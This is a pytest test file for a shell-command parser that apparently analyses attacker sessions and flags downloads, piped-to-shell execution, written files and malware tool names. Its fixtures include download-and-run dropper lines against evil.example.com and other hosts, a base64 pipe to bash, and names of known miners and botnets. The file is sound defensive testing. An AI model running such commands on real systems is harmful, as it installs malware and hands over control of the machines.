import pytest

from brain.commands import (
    command_name,
    domains,
    downloaded_files,
    executed_files,
    is_download,
    pipes_to_shell,
    segments,
    tool_names,
    written_files,
    chmodded_executable,
    urls,
)

BOT_LINE = "cd /tmp || cd /var/run; wget http://evil.example.com/bins.sh; chmod 777 bins.sh; sh bins.sh"


def test_segments():
    assert segments("a; b && c || d | e\nf") == ["a", "b", "c", "d", "e", "f"]
    assert segments("") == []


def test_command_name_skips_wrappers():
    assert command_name("sudo FOO=1 /usr/bin/wget x") == "wget"
    assert command_name("/bin/busybox tftp -g") == "tftp"
    assert command_name("./xmrig -o pool") == "./xmrig"


def test_urls_and_domains():
    assert urls(BOT_LINE) == ["http://evil.example.com/bins.sh"]
    assert domains(BOT_LINE) == ["evil.example.com"]
    assert domains("wget 45.9.1.2/x86") == ["45.9.1.2"]
    assert domains("cat notes.txt") == []
    assert domains("wget config.sh") == []


def test_is_download():
    assert is_download(BOT_LINE)
    assert is_download("curl -fsSL https://x.io/i.sh | bash")
    assert is_download("tftp -g -r mips 1.2.3.4")
    assert is_download("scp user@host:/f .")
    assert not is_download("curl --version")
    assert not is_download("cat wget.log")


def test_downloaded_and_executed_files():
    assert downloaded_files(BOT_LINE) == ["bins.sh"]
    assert downloaded_files("wget -O /tmp/.x http://a.b/c") == [".x", "c"]
    assert executed_files(BOT_LINE) == ["bins.sh"]
    assert executed_files("./xmrig -o x; /tmp/kd") == ["xmrig", "kd"]
    assert executed_files("bash -i") == []


def test_pipes_to_shell():
    assert pipes_to_shell("curl x | sh")
    assert pipes_to_shell("echo aGk= | base64 -d | bash")
    assert not pipes_to_shell("ls | grep sh")


def test_tool_names():
    assert "xmrig" in tool_names("./xmrig --donate-level 1")
    assert "kinsing" in tool_names("wget http://a.b/kinsing")
    assert tool_names("ls -la; cat /etc/passwd; uname -a") == []


def test_written_files():
    assert written_files("echo -ne '\x7fELF' > /tmp/.d") == ["/tmp/.d"]
    assert written_files("printf 'a' >> .x") == [".x"]
    assert written_files("echo f0VMRgI= | base64 -d > /tmp/k") == ["/tmp/k"]
    assert written_files("echo 'a > b' | tee -a run.sh /tmp/two") == ["run.sh", "/tmp/two"]
    assert written_files("cat > \"/tmp/s p\" << EOF") == ["/tmp/s p"]
    # not writes: other commands, stderr, /dev, base64 encoding
    assert written_files("uname -a > /dev/null 2> err.log") == []
    assert written_files("ls > files.txt") == []
    assert written_files("echo hi | base64 > enc.txt") == []
    assert written_files("echo 'x > y'") == []


def test_chmodded_executable():
    assert chmodded_executable("chmod +x /tmp/.d") == [".d"]
    assert chmodded_executable("chmod 755 a b; chmod u+x c") == ["a", "b", "c"]
    assert chmodded_executable("chmod 644 a; chmod -x b; chmod +r c") == []


def test_tool_names_only_programs_run_or_downloaded():
    # named but never run as a program
    assert tool_names("cat log | kinsing_parser; grep xmrig /tmp/log") == []
    assert tool_names("chmod +x mirai.arm7") == ["mirai.arm7"]
    assert tool_names("curl -o /tmp/kdevtmpfsi http://a.b/x") == ["kdevtmpfsi"]


@pytest.mark.parametrize("line", [
    "wget http://a.b/filter; chmod +x filter; ./filter",  # english word
    "./update.sh", "sh install.sh", "bash setup",  # english words
    "./source", "sh export", "./alias",  # shell builtins
    "./netstat", "chmod +x /tmp/crontab", "./busybox",  # standard commands
    "./x86", "sh a.sh", "./kd",  # under 4 characters
])
def test_tool_names_skip_generic_names(line):
    assert tool_names(line) == []
